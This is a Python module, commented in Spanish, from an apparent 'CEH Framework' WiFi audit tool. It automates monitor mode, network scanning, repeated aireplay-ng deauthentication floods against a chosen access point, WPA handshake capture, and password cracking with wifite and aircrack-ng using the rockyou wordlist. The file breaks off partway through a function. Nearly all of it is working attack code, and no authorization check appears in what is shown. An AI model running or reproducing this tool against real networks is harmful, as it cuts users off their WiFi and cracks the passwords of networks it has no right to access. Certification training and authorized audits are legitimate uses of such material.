"""
modules/wifi/wifi_audit.py — Módulo de Auditoría WiFi
CEH Framework — Compatible con Kali Linux, Ubuntu, Arch Linux

Flujo completo:
  1. Detectar interfaces WiFi disponibles
  2. Validar capacidades de monitor mode (iw / iwconfig)
  3. Poner interfaz en modo monitor (airmon-ng)
  4. Escanear redes con airodump-ng
  5. Seleccionar red objetivo
  6. Ataque automático con wifite
  7. Fallback: captura handshake + aircrack-ng con rockyou
  8. Restaurar interfaz al terminar
"""

import os
import re
import time
import signal
import subprocess
import threading
from pathlib import Path
from dataclasses import dataclass, field

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.rule import Rule
from rich import box

from core.privileges import IS_ROOT, SUDO_PREFIX, require_root
from core.utils import (
    run_command, check_tool,
    print_result, print_error, print_info,
    print_warning, print_success, save_report, separator
)

console = Console()

# ─── Rutas ────────────────────────────────────────────────────────────────────
ROCKYOU_PATHS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",
    "/opt/wordlists/rockyou.txt",
]
ROCKYOU_URL  = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
ROCKYOU_DIR  = "/usr/share/wordlists"
CAPTURE_DIR  = "/tmp/ceh_wifi"

# ─── Dataclasses ──────────────────────────────────────────────────────────────

@dataclass
class WifiInterface:
    name:       str          # wlan0, wlan1, etc.
    driver:     str = ""
    chipset:    str = ""
    mac:        str = ""
    mode:       str = "managed"   # managed | monitor
    monitor_name: str = ""        # wlan0mon después de airmon-ng
    supports_monitor: bool = False
    supports_injection: bool = False

@dataclass
class WifiNetwork:
    bssid:    str
    essid:    str
    channel:  str
    power:    str          # dBm
    enc:      str          # WPA2, WPA, WEP, OPN
    cipher:   str
    auth:     str
    clients:  int = 0
    wps:      bool = False

# ─── Detección de herramientas ─────────────────────────────────────────────────

REQUIRED_TOOLS = {
    "airmon-ng":   {"apt": "aircrack-ng",          "pacman": "aircrack-ng"},
    "airodump-ng": {"apt": "aircrack-ng",          "pacman": "aircrack-ng"},
    "aireplay-ng": {"apt": "aircrack-ng",          "pacman": "aircrack-ng"},
    "aircrack-ng": {"apt": "aircrack-ng",          "pacman": "aircrack-ng"},
    "wifite":      {"apt": "wifite",               "pacman": "wifite"},
    "tshark":      {"apt": "tshark",               "pacman": "wireshark-cli"},
    "iw":          {"apt": "iw",                   "pacman": "iw"},
}

def _check_wifi_tools() -> dict[str, bool]:
    return {t: check_tool(t) for t in REQUIRED_TOOLS}

def _show_tool_status(tools: dict[str, bool]):
    table = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    table.add_column("Tool",   style="white",      width=16)
    table.add_column("Estado", style="bold",       width=12)
    for tool, ok in tools.items():
        status = "[green]✔ OK[/green]" if ok else "[red]✗ Faltante[/red]"
        table.add_row(tool, status)
    console.print(table)

def _install_missing_tools(tools: dict[str, bool]):
    from core.compat import detect_distro
    distro  = detect_distro()
    pkg_mgr = distro.get("pkg_mgr", "apt")

    missing_pkgs = set()
    for tool, ok in tools.items():
        if not ok:
            pkg = REQUIRED_TOOLS[tool].get(pkg_mgr, "aircrack-ng")
            missing_pkgs.add(pkg)

    if not missing_pkgs:
        return

    print_info(f"Instalando: [bold]{', '.join(missing_pkgs)}[/bold]")
    install_cmd = {
        "apt":    ["apt-get", "install", "-y"],
        "pacman": ["pacman", "-S", "--noconfirm"],
    }.get(pkg_mgr, ["apt-get", "install", "-y"])

    cmd = SUDO_PREFIX + install_cmd + list(missing_pkgs)
    stdout, stderr, code = run_command(cmd, timeout=300)
    if code == 0:
        print_success("Herramientas instaladas correctamente.")
    else:
        print_error(f"Instalación parcial. Revisa manualmente:\n{stderr[:300]}")


# ─── Detección de interfaces WiFi ─────────────────────────────────────────────

def _get_wifi_interfaces() -> list[WifiInterface]:
    """
    Detecta interfaces WiFi usando iw, iwconfig y /proc/net/wireless.
    Retorna lista de WifiInterface.
    """
    interfaces: list[WifiInterface] = []

    # Método 1: iw dev
    stdout, _, code = run_command(["iw", "dev"], timeout=5)
    if code == 0:
        current_iface = None
        for line in stdout.splitlines():
            line = line.strip()
            m_iface = re.match(r"Interface\s+(\S+)", line)
            m_type  = re.match(r"type\s+(\S+)", line)
            m_addr  = re.match(r"addr\s+([0-9a-f:]{17})", line, re.IGNORECASE)

            if m_iface:
                current_iface = WifiInterface(name=m_iface.group(1))
                interfaces.append(current_iface)
            elif current_iface:
                if m_type:
                    current_iface.mode = m_type.group(1)
                elif m_addr:
                    current_iface.mac = m_addr.group(1)

    # Método 2: /sys/class/net — detectar físicas wireless
    if not interfaces:
        for iface_path in Path("/sys/class/net").iterdir():
            wireless_path = iface_path / "wireless"
            phy_path      = iface_path / "phy80211"
            if wireless_path.exists() or phy_path.exists():
                iface = WifiInterface(name=iface_path.name)
                interfaces.append(iface)

    # Método 3: airmon-ng para obtener chipset/driver
    stdout_airmon, _, _ = run_command(
        SUDO_PREFIX + ["airmon-ng"],
        timeout=10
    )
    for iface in interfaces:
        for line in stdout_airmon.splitlines():
            if iface.name in line:
                parts = line.split()
                if len(parts) >= 3:
                    iface.driver  = parts[1] if len(parts) > 1 else ""
                    iface.chipset = " ".join(parts[2:]) if len(parts) > 2 else ""

    return interfaces


def _check_monitor_support(iface: WifiInterface) -> bool:
    """
    Verifica si la interfaz soporta modo monitor consultando iw phy info.
    """
    # Buscar el phy asociado a la interfaz
    stdout, _, _ = run_command(
        ["iw", iface.name, "info"],
        timeout=5
    )
    phy = ""
    for line in stdout.splitlines():
        m = re.search(r"wiphy\s+(\d+)", line)
        if m:
            phy = f"phy{m.group(1)}"
            break

    if not phy:
        # Intentar con /sys
        phy_link = Path(f"/sys/class/net/{iface.name}/phy80211")
        if phy_link.exists():
            phy = phy_link.resolve().name

    if not phy:
        return True  # Asumir que sí (airmon-ng lo confirmará)

    # Consultar modos soportados
    stdout, _, _ = run_command(["iw", phy, "info"], timeout=5)
    return "monitor" in stdout.lower()


def _check_injection_support(iface_monitor: str) -> bool:
    """
    Test de inyección con aireplay-ng -9.
    Retorna True si el driver soporta packet injection.
    """
    stdout, _, code = run_command(
        SUDO_PREFIX + ["aireplay-ng", "--test", iface_monitor],
        timeout=20
    )
    return "injection is working" in stdout.lower() or "injections" in stdout.lower()


# ─── Modo monitor ──────────────────────────────────────────────────────────────

def _get_iw_dev_interfaces() -> dict[str, str]:
    """
    Retorna dict {nombre_iface: tipo} leyendo `iw dev`.
    Ej: {"wlan0": "managed", "wlan1mon": "monitor"}
    """
    result = {}
    stdout, _, _ = run_command(["iw", "dev"], timeout=5)
    current = None
    for line in stdout.splitlines():
        line = line.strip()
        m_iface = re.match(r"Interface\s+(\S+)", line)
        m_type  = re.match(r"type\s+(\S+)", line)
        if m_iface:
            current = m_iface.group(1)
            result[current] = "unknown"
        elif m_type and current:
            result[current] = m_type.group(1)
    return result


def _enable_monitor_mode(iface: WifiInterface) -> str | None:
    """
    Pone la interfaz en modo monitor.
    Intenta primero con airmon-ng, luego con iw directo como fallback.
    Verifica que la interfaz monitor realmente exista antes de retornar.
    """
    # Snapshot de interfaces ANTES del cambio
    ifaces_before = set(_get_iw_dev_interfaces().keys())

    # Matar procesos que interfieren
    print_info("Deteniendo procesos que pueden interferir...")
    out_kill, _, _ = run_command(SUDO_PREFIX + ["airmon-ng", "check", "kill"], timeout=15)
    if out_kill.strip():
        for line in out_kill.splitlines():
            if line.strip() and "Killing" in line:
                console.print(f"  [dim]  {line.strip()}[/dim]")

    # ── Método 1: airmon-ng start ─────────────────────────────────────────────
    print_info(f"Intentando airmon-ng start [bold]{iface.name}[/bold]...")
    stdout_am, stderr_am, code_am = run_command(
        SUDO_PREFIX + ["airmon-ng", "start", iface.name],
        timeout=20
    )

    # Mostrar output real para diagnóstico
    combined = (stdout_am + stderr_am).strip()
    if combined:
        for line in combined.splitlines()[-8:]:   # últimas 8 líneas
            console.print(f"  [dim]{line}[/dim]")

    # Snapshot DESPUÉS — buscar interfaz nueva en modo monitor
    time.sleep(1)
    ifaces_after = _get_iw_dev_interfaces()
    new_ifaces   = set(ifaces_after.keys()) - ifaces_before

    mon_name = None

    # Buscar entre las nuevas que sean monitor
    for name in new_ifaces:
        if ifaces_after.get(name) == "monitor":
            mon_name = name
            break

    # Si no hay nuevas, buscar alguna existente en modo monitor
    if not mon_name:
        for name, mode in ifaces_after.items():
            if mode == "monitor" and name != iface.name:
                mon_name = name
                break
        # Puede que la misma interfaz pasó a monitor (algunos drivers)
        if not mon_name and ifaces_after.get(iface.name) == "monitor":
            mon_name = iface.name

    # ── Método 2: iw set monitor (fallback si airmon-ng no funcionó) ──────────
    if not mon_name:
        print_warning("airmon-ng no creó interfaz monitor. Intentando con [bold]iw[/bold] directamente...")

        # Bajar la interfaz, cambiar tipo, subirla
        run_command(SUDO_PREFIX + ["ip",  "link", "set", iface.name, "down"],  timeout=5)
        run_command(SUDO_PREFIX + ["iw",  iface.name, "set", "type", "monitor"], timeout=5)
        run_command(SUDO_PREFIX + ["ip",  "link", "set", iface.name, "up"],    timeout=5)
        time.sleep(1)

        # Verificar que quedó en monitor
        ifaces_now = _get_iw_dev_interfaces()
        if ifaces_now.get(iface.name) == "monitor":
            mon_name = iface.name
            print_success(f"Modo monitor activado via iw: [bold]{mon_name}[/bold]")
        else:
            # Último intento: iwconfig
            run_command(SUDO_PREFIX + ["iwconfig", iface.name, "mode", "monitor"], timeout=5)
            run_command(SUDO_PREFIX + ["ip", "link", "set", iface.name, "up"], timeout=5)
            time.sleep(1)
            ifaces_now2 = _get_iw_dev_interfaces()
            if ifaces_now2.get(iface.name) == "monitor":
                mon_name = iface.name

    if not mon_name:
        print_error(
            "No se pudo activar el modo monitor.\n"
            f"  Verifica manualmente:\n"
            f"  [bold]sudo airmon-ng start {iface.name}[/bold]\n"
            f"  [bold]iw dev[/bold]  ← confirma que aparezca en modo monitor"
        )
        return None

    # Verificación final: confirmar que la interfaz existe y está up
    check_out, _, _ = run_command(["iw", "dev", mon_name, "info"], timeout=5)
    if "monitor" not in check_out.lower():
        print_warning(f"Interfaz [bold]{mon_name}[/bold] detectada pero no confirmada en monitor mode.")
        print_warning("Continuando de todas formas...")

    print_success(f"Modo monitor activo: [bold]{mon_name}[/bold]")
    return mon_name


def _disable_monitor_mode(mon_iface: str, original_iface: str):
    """Restaura la interfaz a modo managed."""
    print_info(f"Restaurando [bold]{mon_iface}[/bold] a modo managed...")
    run_command(SUDO_PREFIX + ["airmon-ng", "stop", mon_iface], timeout=15)

    # Reiniciar NetworkManager si existe
    if check_tool("nmcli"):
        run_command(SUDO_PREFIX + ["systemctl", "start", "NetworkManager"], timeout=10)
        print_success("NetworkManager reiniciado.")


# ─── Escaneo de redes ──────────────────────────────────────────────────────────

def _scan_networks(mon_iface: str, duration: int = 20) -> list[WifiNetwork]:
    """
    Escanea redes con airodump-ng durante `duration` segundos.
    Parsea el CSV generado y retorna lista de WifiNetwork.
    """
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    csv_prefix = f"{CAPTURE_DIR}/scan"
    csv_file   = f"{csv_prefix}-01.csv"

    # Limpiar capturas previas
    for f in Path(CAPTURE_DIR).glob("scan-*"):
        f.unlink(missing_ok=True)

    console.print()
    print_info(f"Escaneando redes durante [bold]{duration}[/bold] segundos...\n")

    # Verificar que la interfaz monitor existe antes de escanear
    iw_devs = {}
    iw_out, _, _ = run_command(["iw", "dev"], timeout=5)
    for line in iw_out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line.strip())
        if m:
            iw_devs[m.group(1)] = True

    if mon_iface not in iw_devs:
        print_error(
            f"La interfaz [bold]{mon_iface}[/bold] no existe en el sistema.\n"
            f"  Interfaces disponibles: {list(iw_devs.keys()) or ['ninguna detectada']}\n"
            f"  Ejecuta [bold]iw dev[/bold] para ver el nombre real."
        )
        # Ofrecer corrección manual
        manual = Prompt.ask(
            "  Ingresa el nombre correcto de la interfaz monitor (o Enter para cancelar)",
            default=""
        )
        if not manual:
            return []
        mon_iface = manual

    # Lanzar airodump-ng en background — capturar stderr para diagnóstico
    err_file = f"{CAPTURE_DIR}/airodump_err.txt"
    cmd = SUDO_PREFIX + [
        "airodump-ng",
        "--output-format", "csv",
        "--write", csv_prefix,
        "--band", "abg",       # escanear 2.4GHz y 5GHz
        mon_iface
    ]

    with open(err_file, "w") as ef:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=ef,
        )

    # Barra de progreso mientras escanea
    with Progress(
        SpinnerColumn(),
        TextColumn("[cyan]Escaneando redes WiFi...[/cyan]"),
        TextColumn("[dim]{task.fields[found]}[/dim]"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as prog:
        task = prog.add_task("scan", total=duration, found="0 redes")
        elapsed = 0
        while elapsed < duration:
            time.sleep(1)
            elapsed += 1
            prog.advance(task)
            # Contar redes encontradas en tiempo real
            if Path(csv_file).exists():
                count = _count_csv_networks(csv_file)
                prog.update(task, found=f"{count} redes")

    # Terminar airodump-ng
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()

    time.sleep(1)

    if not Path(csv_file).exists():
        # Leer stderr de airodump para diagnóstico
        err_msg = ""
        if Path(err_file).exists():
            try:
                err_msg = Path(err_file).read_text(errors="replace").strip()
            except Exception:
                pass

        print_error(f"No se generó el archivo CSV de escaneo.")

        if err_msg:
            console.print(Panel(
                f"[bold red]Error de airodump-ng:[/bold red]\n\n{err_msg[-600:]}",
                border_style="red", box=box.ROUNDED,
            ))

        # Diagnóstico adicional
        iw_check, _, _ = run_command(["iw", "dev", mon_iface, "info"], timeout=5)
        if "No such device" in iw_check or not iw_check.strip():
            print_error(
                f"La interfaz [bold]{mon_iface}[/bold] no existe o no está en modo monitor.\n"
                f"  Verifica con: [bold]iw dev[/bold]"
            )
        elif "monitor" not in iw_check.lower():
            print_error(
                f"[bold]{mon_iface}[/bold] existe pero NO está en modo monitor.\n"
                f"  Ponla manualmente: [bold]sudo ip link set {mon_iface} down && "
                f"sudo iw {mon_iface} set type monitor && sudo ip link set {mon_iface} up[/bold]"
            )
        return []

    return _parse_airodump_csv(csv_file)


def _count_csv_networks(csv_file: str) -> int:
    try:
        count = 0
        in_ap_section = False
        with open(csv_file, encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if line.startswith("BSSID"):
                    in_ap_section = True
                    continue
                if in_ap_section and line and not line.startswith("Station"):
                    if re.match(r"[0-9A-Fa-f]{2}:", line):
                        count += 1
        return count
    except Exception:
        return 0


def _parse_airodump_csv(csv_file: str) -> list[WifiNetwork]:
    """
    Parsea el CSV de airodump-ng y retorna lista de WifiNetwork.
    El CSV tiene dos secciones: APs y Clients, separadas por línea vacía.
    """
    networks: list[WifiNetwork] = []
    clients_bssid: dict[str, int] = {}

    try:
        with open(csv_file, encoding="utf-8", errors="replace") as f:
            content = f.read()
    except Exception as e:
        print_error(f"No se pudo leer el CSV: {e}")
        return []

    # Separar secciones
    sections = re.split(r"\n\s*\n", content)
    ap_section     = sections[0] if len(sections) > 0 else ""
    client_section = sections[1] if len(sections) > 1 else ""

    # Contar clientes por BSSID
    for line in client_section.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) >= 6 and re.match(r"[0-9A-Fa-f]{2}:", parts[0]):
            bssid = parts[5].strip()
            if bssid and bssid != "(not associated)":
                clients_bssid[bssid] = clients_bssid.get(bssid, 0) + 1

    # Parsear APs
    for line in ap_section.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID"):
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        if not re.match(r"[0-9A-Fa-f]{2}:", parts[0]):
            continue

        bssid   = parts[0].strip()
        power   = parts[8].strip()
        channel = parts[3].strip()
        enc     = parts[5].strip()
        cipher  = parts[6].strip()
        auth    = parts[7].strip()
        essid   = parts[13].strip() if len(parts) > 13 else "<hidden>"

        if not essid:
            essid = "<hidden>"

        net = WifiNetwork(
            bssid   = bssid,
            essid   = essid,
            channel = channel,
            power   = power,
            enc     = enc,
            cipher  = cipher,
            auth    = auth,
            clients = clients_bssid.get(bssid, 0),
        )
        networks.append(net)

    # Ordenar por señal (más fuerte primero)
    def _signal_key(n: WifiNetwork) -> int:
        try:
            return int(n.power)
        except ValueError:
            return -100

    networks.sort(key=_signal_key, reverse=True)
    return networks


# ─── UI de selección de red ───────────────────────────────────────────────────

def _render_networks_table(networks: list[WifiNetwork]):
    ENC_COLORS = {
        "WPA2": "yellow",
        "WPA":  "yellow",
        "WEP":  "red",
        "OPN":  "bold green",
        "WPA3": "cyan",
    }

    table = Table(
        title=f"🔍 Redes WiFi Detectadas ({len(networks)})",
        box=box.DOUBLE_EDGE,
        border_style="cyan",
        header_style="bold cyan",
    )
    table.add_column("#",       style="bold yellow",  width=5,  justify="center")
    table.add_column("ESSID",   style="bold white",   width=24)
    table.add_column("BSSID",   style="dim white",    width=20)
    table.add_column("CH",      style="cyan",         width=5,  justify="center")
    table.add_column("Señal",   style="white",        width=8,  justify="right")
    table.add_column("Enc",     style="bold",         width=8,  justify="center")
    table.add_column("Clientes",style="green",        width=10, justify="center")

    for i, net in enumerate(networks, 1):
        enc_color = ENC_COLORS.get(net.enc.upper(), "white")
        signal_icon = (
            "[green]████[/green]" if int(net.power or -100) > -50 else
            "[yellow]███░[/yellow]" if int(net.power or -100) > -65 else
            "[red]██░░[/red]"
        ) if net.power and net.power.lstrip("-").isdigit() else "—"

        table.add_row(
            str(i),
            net.essid[:24],
            net.bssid,
            net.channel,
            f"{net.power} dBm",
            f"[{enc_color}]{net.enc}[/{enc_color}]",
            str(net.clients) if net.clients else "—",
        )

    console.print(table)


# ─── rockyou ──────────────────────────────────────────────────────────────────

# Siempre descomprimimos a /tmp — permisos garantizados
ROCKYOU_PLAIN = "/tmp/ceh_rockyou.txt"

# Rutas a probar para encontrar el archivo (comprimido o no)
ROCKYOU_SEARCH = [
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/wordlists/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
    "/opt/wordlists/rockyou.txt.gz",
]


def _get_rockyou() -> str | None:
    """
    Retorna la ruta a rockyou.txt descomprimido y listo para aircrack.
    Estrategia: zcat / gunzip -c > /tmp/ceh_rockyou.txt
    Esto evita TODOS los problemas de symlinks, permisos y detección gzip.
    """
    # 1. Ya descomprimido en /tmp de una ejecución anterior (>50 MB)
    plain = Path(ROCKYOU_PLAIN)
    if plain.exists() and plain.stat().st_size > 50_000_000:
        size_mb = plain.stat().st_size / 1_048_576
        print_info(f"Usando rockyou ya descomprimido: [bold]{ROCKYOU_PLAIN}[/bold] ({size_mb:.0f} MB)")
        return ROCKYOU_PLAIN

    # 2. Buscar fuente y descomprimir con zcat (más robusto que Python gzip para symlinks)
    for src in ROCKYOU_SEARCH:
        sp = Path(src)
        # Resolver symlink manualmente para obtener el target real
        real_src = src
        try:
            if sp.is_symlink():
                target = sp.resolve()
                real_src = str(target)
                print_info(f"[dim]{src}[/dim] → symlink → [dim]{real_src}[/dim]")
        except Exception:
            pass

        if not Path(real_src).exists():
            continue

        real_size = Path(real_src).stat().st_size
        if real_size == 0:
            continue

        print_info(f"Encontrado: [bold]{real_src}[/bold] ({real_size/1_048_576:.0f} MB) — descomprimiendo...")
        print_warning("Esto puede tardar 30-60 segundos la primera vez...")

        # Intentar zcat primero (maneja .gz y archivos gzip con cualquier extensión)
        for decomp_cmd in [
            ["zcat", real_src],
            ["gunzip", "-c", real_src],
        ]:
            if not check_tool(decomp_cmd[0]):
                continue
            try:
                proc = subprocess.Popen(
                    decomp_cmd,
                    stdout=open(ROCKYOU_PLAIN, "wb"),
                    stderr=subprocess.PIPE,
                )
                _, err = proc.communicate(timeout=180)
                if proc.returncode == 0 and plain.exists() and plain.stat().st_size > 50_000_000:
                    size_mb = plain.stat().st_size / 1_048_576
                    print_success(f"Descomprimido: [bold]{ROCKYOU_PLAIN}[/bold] ({size_mb:.0f} MB)")
                    return ROCKYOU_PLAIN
                else:
                    # Limpiar resultado parcial
                    plain.unlink(missing_ok=True)
            except Exception as e:
                plain.unlink(missing_ok=True)
                print_warning(f"{decomp_cmd[0]} falló: {e}")

        # Fallback: Python gzip
        try:
            import gzip as _gz, shutil as _sh
            with _gz.open(real_src, "rb") as fin, open(ROCKYOU_PLAIN, "wb") as fout:
                _sh.copyfileobj(fin, fout)
            if plain.exists() and plain.stat().st_size > 50_000_000:
                size_mb = plain.stat().st_size / 1_048_576
                print_success(f"Descomprimido (Python gzip): [bold]{ROCKYOU_PLAIN}[/bold] ({size_mb:.0f} MB)")
                return ROCKYOU_PLAIN
            plain.unlink(missing_ok=True)
        except Exception as e:
            plain.unlink(missing_ok=True)
            # No es gzip — quizás ya está descomprimido pero es grande
            if Path(real_src).stat().st_size > 50_000_000:
                print_info(f"Usando directamente (no comprimido): [bold]{real_src}[/bold]")
                return real_src

    # 3. Descargar directo descomprimido a /tmp
    print_warning("rockyou.txt no encontrado en el sistema. Descargando (~130 MB)...")
    URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    for dl in ["wget", "curl"]:
        if not check_tool(dl):
            continue
        cmd = (
            ["wget", "-q", "--show-progress", "-O", ROCKYOU_PLAIN, URL]
            if dl == "wget"
            else ["curl", "-L", "--progress-bar", "-o", ROCKYOU_PLAIN, URL]
        )
        _, _, code = run_command(SUDO_PREFIX + cmd, timeout=600)
        if code == 0 and plain.exists() and plain.stat().st_size > 50_000_000:
            print_success(f"Descargado: [bold]{ROCKYOU_PLAIN}[/bold]")
            return ROCKYOU_PLAIN

    print_error("No se pudo obtener rockyou.txt.")
    return None


# ─── Captura de handshake ─────────────────────────────────────────────────────

def _capture_handshake(mon_iface: str, network: WifiNetwork,
                        capture_time: int = 60) -> str | None:
    """
    Captura el handshake WPA de la red objetivo.
    1. Lanza airodump-ng dirigido al AP
    2. Envía deauth con aireplay-ng para forzar reconexión
    3. Espera el handshake
    Retorna la ruta al .cap o None.
    """
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    cap_prefix = f"{CAPTURE_DIR}/handshake_{network.bssid.replace(':', '-')}"
    cap_file   = f"{cap_prefix}-01.cap"

    # Limpiar capturas previas del mismo AP
    for f in Path(CAPTURE_DIR).glob(f"handshake_{network.bssid.replace(':', '-')}*"):
        f.unlink(missing_ok=True)

    print_info(
        f"Capturando handshake de [bold]{network.essid}[/bold] "
        f"([cyan]{network.bssid}[/cyan]) CH:[bold]{network.channel}[/bold]"
    )
    print_warning(f"Esperando reconexión de clientes ({capture_time}s)...\n")

    # Lanzar airodump-ng focalizado
    dump_cmd = SUDO_PREFIX + [
        "airodump-ng",
        "--bssid", network.bssid,
        "--channel", network.channel,
        "--write", cap_prefix,
        "--output-format", "cap",
        mon_iface,
    ]
    dump_proc = subprocess.Popen(
        dump_cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    time.sleep(3)

    # Deauth para forzar reconexión (si hay clientes)
    handshake_found = False

    with Progress(
        SpinnerColumn(),
        TextColumn("[cyan]{task.description}[/cyan]"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as prog:
        task = prog.add_task("Esperando handshake...", total=None)
        elapsed = 0

        # Lanzar deauth en background cada 15s
        def _send_deauth():
            deauth_cmd = SUDO_PREFIX + [
                "aireplay-ng",
                "--deauth", "10",
                "-a", network.bssid,
                mon_iface,
            ]
            run_command(deauth_cmd, timeout=15)

        deauth_thread = threading.Thread(target=_send_deauth, daemon=True)
        deauth_thread.start()

        while elapsed < capture_time:
            time.sleep(2)
            elapsed += 2

            # Verificar si ya capturamos el handshake
            if Path(cap_file).exists():
                chk_out, _, _ = run_command(
                    ["aircrack-ng", cap_file],
                    timeout=10
                )
                if "1 handshake" in chk_out.lower() or "WPA" in chk_out:
                    handshake_found = True
                    break

            # Enviar otro deauth cada 20s
            if elapsed % 20 == 0:
                dt = threading.Thread(target=_send_deauth, daemon=True)
                dt.start()

            prog.update(task, description=f"Esperando handshake... {elapsed}s / {capture_time}s")

    dump_proc.terminate()
    try:
        dump_proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        dump_proc.kill()

    if handshake_found:
        print_success(f"Handshake capturado: [bold]{cap_file}[/bold]")
        return cap_file
    elif Path(cap_file).exists():
        print_warning("Tiempo agotado — archivo de captura guardado pero handshake no confirmado.")
        print_info("Puedes intentar crackearlo manualmente de todas formas.")
        return cap_file
    else:
        print_error("No se capturó handshake. Verifica que haya clientes conectados a la red.")
        return None


# ─── Métodos de ataque ────────────────────────────────────────────────────────

def _extract_wifite_password(output: str) -> str:
    """Extrae la contraseña del output de wifite."""
    # Wifite muestra: "WPA Key: PASSWORD" o "PSK: PASSWORD" o "password: PASSWORD"
    patterns = [
        r"WPA Key[:\s]+(\S+)",
        r"PSK[:\s]+(\S+)",
        r"[Pp]assword[:\s]+(\S+)",
        r"KEY FOUND!\s*\[\s*([^\]]+)\s*\]",
        r"cracked[:\s]+(\S+)",
    ]
    for pat in patterns:
        m = re.search(pat, output, re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return ""


def _attack_wifite(mon_iface: str, network: WifiNetwork) -> tuple[bool, str]:
    """
    Ataque automático con wifite apuntando al BSSID específico.
    Retorna (cracked: bool, password: str).
    """
    if not check_tool("wifite"):
        print_warning("wifite no está instalado.")
        return False, ""

    # Verificar cowpatty (requerido por wifite para crackear WPA)
    for dep_tool, dep_pkg in [("tshark", "tshark"), ("cowpatty", "cowpatty")]:
        if not check_tool(dep_tool):
            print_warning(f"[bold]{dep_tool}[/bold] no instalado — requerido por wifite.")
            from core.compat import detect_distro
            distro  = detect_distro()
            pkg_mgr = distro.get("pkg_mgr", "apt")
            pkg_map = {"tshark": {"apt": "tshark", "pacman": "wireshark-cli"},
                       "cowpatty": {"apt": "cowpatty", "pacman": "cowpatty"}}
            pkg = pkg_map[dep_tool].get(pkg_mgr, dep_tool)
            print_info(f"Instalando [bold]{pkg}[/bold]...")
            run_command(SUDO_PREFIX + (
                ["apt-get", "install", "-y", pkg] if pkg_mgr == "apt"
                else ["pacman", "-S", "--noconfirm", pkg]
            ), timeout=120)
            if check_tool(dep_tool):
                print_success(f"{dep_tool} instalado.")
            else:
                print_warning(f"No se pudo instalar {dep_tool} — wifite puede fallar.")

    # Verificar tshark (mantenemos el check original también)
    if not check_tool("tshark"):
        print_warning("[bold]tshark[/bold] no está instalado — wifite lo necesita para escanear.")
        from core.compat import detect_distro
        distro  = detect_distro()
        pkg_mgr = distro.get("pkg_mgr", "apt")
        pkg     = "tshark" if pkg_mgr == "apt" else "wireshark-cli"
        print_info(f"Instalando [bold]{pkg}[/bold]...")
        _, _, code = run_command(SUDO_PREFIX + (
            ["apt-get", "install", "-y", pkg] if pkg_mgr == "apt"
            else ["pacman", "-S", "--noconfirm", pkg]
        ), timeout=120)
        if not check_tool("tshark"):
            print_error("No se pudo instalar tshark. wifite no funcionará correctamente.")
            return False, ""
        print_success("tshark instalado.")

    console.print(Rule("[bold cyan][ Ataque 1/2 ] WIFITE — Automático[/bold cyan]", style="cyan"))
    print_info(f"Atacando [bold]{network.essid}[/bold] con wifite...")
    print_warning("Ctrl+C para saltar al método manual.\n")

    # Intentar instalar hcxpcapngtool (wifite lo usa para WPA cracking)
    if not check_tool("hcxpcapngtool"):
        print_info("Instalando [bold]hcxpcapngtool[/bold] (requerido por wifite para crackear)...")
        from core.compat import detect_distro as _dd
        _pm = _dd().get("pkg_mgr", "apt")
        run_command(SUDO_PREFIX + (
            ["apt-get", "install", "-y", "hcxtools"] if _pm == "apt"
            else ["pacman", "-S", "--noconfirm", "hcxtools"]
        ), timeout=120)
        if check_tool("hcxpcapngtool"):
            print_success("hcxpcapngtool instalado.")
        else:
            print_warning("hcxpcapngtool no disponible — wifite usará solo aircrack.")

    # Usar rockyou descomprimido si existe, si no el path original
    rockyou_dict = ROCKYOU_PLAIN if Path(ROCKYOU_PLAIN).exists() and Path(ROCKYOU_PLAIN).stat().st_size > 50_000_000 else "/usr/share/wordlists/rockyou.txt"

    cmd = SUDO_PREFIX + [
        "wifite",
        "--bssid",    network.bssid,
        "--channel",  network.channel,
        "-i",         mon_iface,
        "--kill",
        "--dict",     rockyou_dict,
    ]
    # Agregar --aircrack-only solo si hcxpcapngtool no está disponible
    if not check_tool("hcxpcapngtool"):
        cmd.append("--aircrack-only")
    print_info(f"Ejecutando: [bold]{' '.join(cmd)}[/bold]\n")

    # Guardar output en archivo para análisis posterior
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    wifite_log = f"{CAPTURE_DIR}/wifite_output.txt"
    _ansi_re = re.compile(r"\x1b\[[0-9;]*[mGKHF]|\x1b\([AB]|\r")

    try:
        # Tee: mostrar en pantalla Y guardar en archivo limpio (sin ANSI)
        with open(wifite_log, "w") as log_f:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            output_lines = []
            for line in proc.stdout:
                print(line, end="", flush=True)        # pantalla: con colores
                clean = _ansi_re.sub("", line)         # archivo: sin ANSI
                log_f.write(clean)
                output_lines.append(clean)
            proc.wait(timeout=600)

        full_output = "".join(output_lines)
        password = _extract_wifite_password(full_output)

        # Buscar también en el archivo cracked.json que genera wifite2
        if not password:
            for cracked_path in [
                Path.home() / ".wifite2" / "cracked.json",
                Path("/root/.wifite2/cracked.json"),
                Path("cracked.txt"),
            ]:
                if cracked_path.exists():
                    try:
                        text = cracked_path.read_text()
